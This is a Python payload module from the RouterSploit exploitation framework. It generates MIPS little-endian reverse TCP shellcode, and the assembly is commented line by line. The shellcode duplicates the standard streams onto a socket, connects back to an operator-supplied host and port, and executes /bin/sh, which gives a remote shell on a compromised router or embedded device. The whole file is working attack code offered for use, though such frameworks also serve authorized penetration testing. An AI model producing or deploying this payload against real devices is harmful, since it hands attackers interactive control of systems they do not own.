from routersploit import validators
from routersploit.payloads import (
    ArchitectureSpecificPayload,
    Architectures,
    ReverseTCPPayloadMixin,
)


class Exploit(ReverseTCPPayloadMixin, ArchitectureSpecificPayload):
    __info__ = {
        'name': 'MIPSLE Reverse TCP',
        'authors': [
        ],
        'description': '',
        'references': [
        ],
        'devices': [
        ],
    }

    architecture = Architectures.MIPSLE

    def generate(self):
        reverse_ip = validators.convert_ip(self.lhost)
        reverse_port = validators.convert_port(self.lport)
        return (
            "\xff\xff\x04\x28" +            # slti    a0,zero,-1
            "\xa6\x0f\x02\x24" +            # li      v0,4006
            "\x0c\x09\x09\x01" +            # syscall 0x42424
            "\x11\x11\x04\x28" +            # slti    a0,zero,4369
            "\xa6\x0f\x02\x24" +            # li      v0,4006
            "\x0c\x09\x09\x01" +            # syscall 0x42424
            "\xfd\xff\x0c\x24" +            # li      t4,-3
            "\x27\x20\x80\x01" +            # nor     a0,t4,zero
            "\xa6\x0f\x02\x24" +            # li      v0,4006
            "\x0c\x09\x09\x01" +            # syscall 0x42424
            "\xfd\xff\x0c\x24" +            # li      t4,-3
            "\x27\x20\x80\x01" +            # nor     a0,t4,zero
            "\x27\x28\x80\x01" +            # nor     a1,t4,zero
            "\xff\xff\x06\x28" +            # slti    a2,zero,-1
            "\x57\x10\x02\x24" +            # li      v0,4183
            "\x0c\x09\x09\x01" +            # syscall 0x42424
            "\xff\xff\x44\x30" +            # andi    a0,v0,0xffff
            "\xc9\x0f\x02\x24" +            # li      v0,4041
            "\x0c\x09\x09\x01" +            # syscall 0x42424
            "\xc9\x0f\x02\x24" +            # li      v0,4041
            "\x0c\x09\x09\x01" +            # syscall 0x42424
            reverse_port + "\x05\x3c" +     # "\x7a\x69" lui     a1,0x697a
            "\x02\x00\xa5\x34" +            # ori     a1,a1,0x2
            "\xf8\xff\xa5\xaf" +            # sw      a1,-8(sp)
            reverse_ip[2:] + "\x05\x3c" +   # "\x00\x01" lui     a1,0x100
            reverse_ip[:2] + "\xa5\x34" +   # "\x7f\x00" ori     a1,a1,0x7f
            "\xfc\xff\xa5\xaf" +            # sw      a1,-4(sp)
            "\xf8\xff\xa5\x23" +            # addi    a1,sp,-8
            "\xef\xff\x0c\x24" +            # li      t4,-17
            "\x27\x30\x80\x01" +            # nor     a2,t4,zero
            "\x4a\x10\x02\x24" +            # li      v0,4170
            "\x0c\x09\x09\x01" +            # syscall 0x42424
            "\x62\x69\x08\x3c" +            # lui     t0,0x6962
            "\x2f\x2f\x08\x35" +            # ori     t0,t0,0x2f2f
            "\xec\xff\xa8\xaf" +            # sw      t0,-20(sp)
            "\x73\x68\x08\x3c" +            # lui     t0,0x6873
            "\x6e\x2f\x08\x35" +            # ori     t0,t0,0x2f6e
            "\xf0\xff\xa8\xaf" +            # sw      t0,-16(sp)
            "\xff\xff\x07\x28" +            # slti    a3,zero,-1
            "\xf4\xff\xa7\xaf" +            # sw      a3,-12(sp)
            "\xfc\xff\xa7\xaf" +            # sw      a3,-4(sp)
            "\xec\xff\xa4\x23" +            # addi    a0,sp,-20
            "\xec\xff\xa8\x23" +            # addi    t0,sp,-20
            "\xf8\xff\xa8\xaf" +            # sw      t0,-8(sp)
            "\xf8\xff\xa5\x23" +            # addi    a1,sp,-8
            "\xec\xff\xbd\x27" +            # addiu   sp,sp,-20
            "\xff\xff\x06\x28" +            # slti    a2,zero,-1
            "\xab\x0f\x02\x24" +            # li      v0,4011
            "\x0c\x09\x09\x01"              # syscall 0x42424
        )
